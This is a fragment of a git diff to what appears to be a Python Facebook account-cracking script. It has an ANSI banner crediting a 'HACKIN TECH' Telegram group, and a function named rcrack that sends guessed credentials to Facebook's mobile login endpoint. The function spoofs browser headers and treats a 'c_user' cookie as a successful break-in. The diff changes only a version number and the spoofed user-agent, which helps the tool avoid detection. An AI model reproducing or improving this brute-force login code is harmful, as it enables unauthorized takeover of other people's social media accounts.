@@ -180,7 +180,7 @@ logo =                                          f"""{H}
 \033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Loy Rayess Kabul\033[1;31m 
 \033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m   Nasrat99845\033[1;31m 
 \033[1;31m\033[1;32m\033[1;32mTELEGRAM \033[1;31m\033[1;32m tm.HACKIN TECH \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 5.1\033[1;31m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.2\033[1;31m 
 \033[1;37mTELEGRAM GROUP (HACKIN TECH{ M }\033[1;37m 
 \033[1;92m==========================================================
 \033[33;44m  NAME       NASRAT &ARYAN 🖤❤💚\033[0;m
@@ -324,7 +324,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent':',Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
+    'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5776.211 Safari/537.36',}
             lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
